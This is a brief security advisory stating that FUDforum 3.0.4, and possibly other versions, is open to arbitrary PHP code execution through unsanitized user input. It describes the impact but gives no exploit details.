FUDforum is prone to multiple vulnerabilities that attackers can leverage to execute arbitrary PHP code because the application fails to adequately sanitize user-supplied input.

Attackers may exploit these issues to execute arbitrary PHP code within the context of the affected application. Successful attacks can compromise the affected application and possibly the underlying computer.

FUDforum 3.0.4 is vulnerable; other versions may also be affected.
